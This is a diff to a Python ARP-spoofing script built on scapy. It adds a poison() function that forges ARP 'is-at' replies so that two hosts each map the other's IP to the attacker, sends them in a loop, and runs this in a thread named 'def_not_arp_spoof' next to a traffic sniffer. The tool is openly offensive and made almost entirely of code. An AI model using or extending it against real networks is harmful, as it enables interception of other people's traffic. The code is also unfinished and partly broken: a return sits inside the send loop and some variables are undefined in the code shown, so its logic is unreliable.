@@ -6,7 +6,8 @@ Steps:
 
 '''
 import argparse
-from scapy.all import Ether, ARP, srp
+from scapy.all import Ether, ARP, srp, send
+from time import sleep
 import threading
 
 def get_mac_address(ip):
@@ -22,6 +23,7 @@ def get_mac_address(ip):
 	print(f'{ip} => {mac}')
 
 def clean_ip(addr):
+	#Makes sure that the ip address is valid
 	#print(f'Cleaning {addr}')
 	ret_addr = ''
 	addr_list = addr.split('.')
@@ -35,8 +37,28 @@ def clean_ip(addr):
 				ret_addr += byte + '.'
 	return ret_addr[:-1]
 
-def poison(arg1='arg1_default',arg2='arg2_default',arg3='arg3_default',arg4='arg4_default'):
-	print(f'Poisoning: {arg1} {arg2} {arg3} {arg4}')
+def clean_mac(mac):
+	#Makes sure that the mac address is valid
+
+	return mac
+
+def poison(mac_1=None, ip_1=None, mac_2=None, ip_2=None):
+	print('Poisoning...')
+	if mac_1 and ip_1 and mac_2 and ip_2:
+		#Build arp packet
+		pkt12 = ARP(pdst=ip_1, hwdst=mac_1, psrc=ip_2, op='is-at')
+		pkt21 = ARP(pdst=ip_2, hwdst=mac_2, psrc=ip_1, op='is-at')
+		
+		while True:
+			#Send arp packet to 
+			send(pkt12)	
+			send(pkt21)
+		
+			#Wait a couple seconds
+			sleep(30)
+
+			return 'we need to stop for testing purposes and add some error conditions'
+			
 
 def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac):
 	print('Sniffing initiated...')
@@ -53,11 +75,13 @@ def spoof_time(t_ip, h_ip):
 	# I like this idea...
 	
 	#Kick off thread to poison the cache
-	poison_thread = threading.Thread(target=poison, args=('test1','test2','test3','test4'))
+	poison_thread = threading.Thread(target=poison, args=(clean_mac(t_mac), t_ip, clean_mac(h_mac), h_ip), name='def_not_arp_spoof')
 	poison_thread.run()
 
 	#Receive traffic and output
 	start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac)
+
+	sleep(60)
 
 if __name__ == '__main__':
 	#Usage : $ arpspoof.py -t <targetIP> -r <host>
